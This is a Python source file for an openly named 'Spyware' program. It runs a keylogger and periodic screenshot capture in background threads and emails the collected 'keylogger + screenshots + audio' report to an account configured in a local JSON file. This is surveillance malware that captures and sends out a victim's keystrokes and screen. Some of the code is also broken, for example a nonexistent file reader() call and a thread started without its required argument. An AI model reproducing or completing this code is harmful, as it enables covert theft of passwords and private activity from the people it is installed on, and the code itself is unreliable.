from time import sleep
from threading import Thread
import cv2
import os
from PIL import Image
import shutil
from functools import partial
import multiprocessing
import json
import random

from modules.log import Logger
from modules.grab_screen import Visual
from modules.send_email import send_mail


class Spyware:
    def __init__(self):
        self.screenshot_period = 5
        self.keylogger_period = 5
        self.keylogger_report = ''

        with open('./user_info/info.json') as input_file:
            reader = input_file.reader()
            self.user_info = json.loads(reader)

    def start(self):
        user_path = os.path.expanduser('~\\documents')
        logger = Logger()
        visual = Visual(self.screenshot_period)

        if not os.path.isdir(f'{user_path}\\images_record'):
            os.mkdir(f'{user_path}\\images_record')

        async_tasks = [Thread(target=visual.make_screenshot, daemon=True), Thread(target=logger.init, daemon=True),
                       Thread(target=self.get_keylogger_report, daemon=True)]
        [t.start() for t in async_tasks]

        while True:
            que = input('')

            if que == 'k':
                visual.change_state()
                visual.make_pdf()
                break
            else:
                print('\n')
        [t.join() for t in async_tasks]

    def send_report(self, file_path):
        message_rep = 'Full report (keylogger + screenshots + audio)'
        try:
            send_mail(self.user_info.email, self.user_info.password, message_rep, 'Spyware report', file_path)
        except:
            error_msg = 'Could not send that'
            send_mail(self.user_info.email, self.user_info.password, error_msg, 'Spyware report', file_path)

    def get_keylogger_report(self, logger_instance):
        self.keylogger_report += logger_instance.get_log()

        while True:
            sleep(self.keylogger_period)
            self.keylogger_report += logger_instance.get_log()


if __name__ == '__main__':
    multiprocessing.freeze_support()

    spw = Spyware()
    spw.start()
